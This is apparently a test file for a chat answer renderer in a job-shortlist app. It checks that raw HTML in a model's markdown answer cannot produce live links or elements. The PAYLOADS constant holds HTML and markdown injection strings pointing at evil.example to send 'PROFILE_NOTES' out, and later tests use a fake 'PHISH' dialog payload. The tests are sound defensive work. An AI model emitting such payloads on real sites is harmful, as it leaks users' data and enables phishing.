import {ChatSource} from '@core/model/chat';
import {answerRenderer} from './answer-markdown';

const OFFER_42: ChatSource = {n: 1, kind: 'OFFER', id: 42, title: 'Senior Java "Dev"', source: 'List', date: null, archived: false};

/**
 * The proof of concept of fix 3F-1. A CommonMark type-6 HTML block (`<div>` on its own line) let an
 * attribute quote stay open, so the parser swallowed the next minted element's attributes — the
 * render's mint included — into the attacker's `<a>`, whose own `href` won: a live exfiltration link.
 */
const PAYLOADS: Record<string, string> = {
    divBlockVerified: '<div>\n<a href="https://evil.example/?d=PROFILE_NOTES" title="\n\nSee [the full posting](cite:offer/42) for details.',
    divBlockUnverified: '<div>\n<a href="https://evil.example/?d=PROFILE_NOTES" title="\n\nSee ⟨unverified:42⟩ for details.',
    rawA: '<a href="https://evil.example/">x</a> and [1](cite:offer/42)',
    autolink: 'https://evil.example/?d=x and <https://evil.example/>',
    ref: '[click][r]\n\n[r]: https://evil.example/?d=x',
    area: '<map name="m"><area href="https://evil.example/" shape="default"></map>',
    nestedInCite: '[<a href="https://evil.example/">x</a>](cite:offer/42)',
};

function renderDom(markdown: string): HTMLElement {
    const render = answerRenderer({
        href: (cite) => `/shortlist/${cite.id}?chat=1`,
        source: (cite) => (cite.kind === 'OFFER' && cite.id === 42 ? OFFER_42 : undefined),
        unverifiedWord: () => 'unverified',
        citeLabel: (n, title) => `Source ${n}: ${title}`,
    });
    const box = document.createElement('div');
    box.innerHTML = render(markdown);
    return box;
}

/**
 * Every attribute of every element, as `name=value` lines: where a navigating address would hide.
 * A pill's `aria-label` is left out: it repeats the pill's visible text, which may be any text the
 * model wrote — asserted on its own below.
 */
function attributes(root: HTMLElement): string {
    return [...root.querySelectorAll('*')]
        .flatMap((e) => [...e.attributes].filter((a) => a.name !== 'aria-label').map((a) => `${e.tagName}[${a.name}=${a.value}]`))
        .join('\n');
}

describe('answerRenderer against raw HTML in the answer (fix 3F-1)', () => {
    for (const [name, markdown] of Object.entries(PAYLOADS)) {
        it(`${name}: no attribute carries the attacker's address, and every href is a pill's own`, () => {
            const root = renderDom(markdown);
            expect(attributes(root)).not.toContain('evil.example');
            for (const element of root.querySelectorAll('[href]')) {
                expect(`${element.tagName}:${element.getAttribute('href')}`).toBe('A:/shortlist/42?chat=1');
                expect(element.classList.contains('lg-chat-cite')).toBe(true);
            }
        });
    }

    it('divBlockVerified: the real citation stays a pill that carries its own attributes and nothing else', () => {
        const root = renderDom(PAYLOADS['divBlockVerified']);
        const pills = [...root.querySelectorAll('a')];
        expect(pills).toHaveLength(1);
        expect(pills[0].getAttribute('href')).toBe('/shortlist/42?chat=1');
        expect(pills[0].getAttribute('data-cite')).toBe('OFFER/42');
        expect(pills[0].getAttribute('aria-label')).toBe('Source the full posting: Senior Java "Dev"');
        expect(pills[0].getAttributeNames().sort()).toEqual(['aria-label', 'class', 'data-cite', 'href']);
        // The raw markup is shown for what it is: text.
        expect(root.textContent).toContain('<div>');
        expect(root.querySelectorAll('div, map, area')).toHaveLength(0);
    });

    it('divBlockUnverified: the mark stays a mark with its glyph and hidden word, and nothing links', () => {
        const root = renderDom(PAYLOADS['divBlockUnverified']);
        const mark = root.querySelector('.lg-chat-unverified') as HTMLElement;
        expect(mark.getAttribute('data-unverified')).toBe('42');
        expect(mark.getAttribute('tabindex')).toBe('0');
        expect(mark.closest('a')).toBeNull();
        expect(mark.querySelector('svg.lg-chat-unverified-icon path')).not.toBeNull();
        expect(mark.textContent?.replace(/\s+/g, ' ').trim()).toBe('42 unverified');
        expect(root.querySelectorAll('a, [href]')).toHaveLength(0);
    });

    it('nestedInCite: the pill links in-app, and its label is the text the reader sees, markup included', () => {
        const root = renderDom(PAYLOADS['nestedInCite']);
        const pill = root.querySelector('a.lg-chat-cite') as HTMLAnchorElement;
        expect(pill.getAttribute('href')).toBe('/shortlist/42?chat=1');
        expect(pill.querySelectorAll('*')).toHaveLength(0);
        expect(pill.getAttribute('aria-label')).toBe(`Source ${pill.textContent}: Senior Java "Dev"`);
    });

    it('area: no element keeps an href at all', () => {
        expect(renderDom(PAYLOADS['area']).querySelectorAll('[href]')).toHaveLength(0);
    });

    it('never lets its own bookkeeping out: no slot, mint or glyph placeholder survives', () => {
        for (const markdown of Object.values(PAYLOADS)) {
            expect(renderDom(markdown).querySelectorAll('[data-lg-slot], [data-lg-mint], [data-lg-glyph]')).toHaveLength(0);
        }
    });
});

/**
 * Fix 4F-11: an inline `<code>`, `<kbd>`, `<pre>` or `<script>` flips marked's `inRawBlock`, and every
 * text token after it came out marked `escaped` and was emitted as it stood — raw HTML again.
 */
describe('answerRenderer after an inline raw-block tag (fix 4F-11)', () => {
    it('keeps a tag after `<code>` visible as text', () => {
        const box = renderDom('x <code><b>y</b>');
        expect(box.querySelector('b')).toBeNull();
        expect(box.innerHTML).toContain('&lt;b&gt;');
    });

    for (const tag of ['code', 'kbd', 'pre', 'script']) {
        it(`builds no element from a slash-separated tag after \`<${tag}>\``, () => {
            const box = renderDom(`x <${tag}><dialog/open/class=fixed>PHISH</dialog>`);
            expect(box.querySelector('dialog')).toBeNull();
            expect(box.textContent).toContain('<dialog/open/class=fixed>PHISH');
        });
    }

    it('escapes text after `<code>` exactly once: an entity stays the character it names', () => {
        const box = renderDom('x <code>a &amp; b &lt;i&gt; & c');
        expect(box.textContent).toContain('a & b <i> & c');
        expect(box.querySelector('i')).toBeNull();
    });

    it('still turns a citation after `<code>` into a pill', () => {
        const box = renderDom('x <code><kbd/x> [1](cite:offer/42)');
        expect(box.querySelector('kbd')).toBeNull();
        expect(box.querySelectorAll('a.lg-chat-cite')).toHaveLength(1);
    });
});
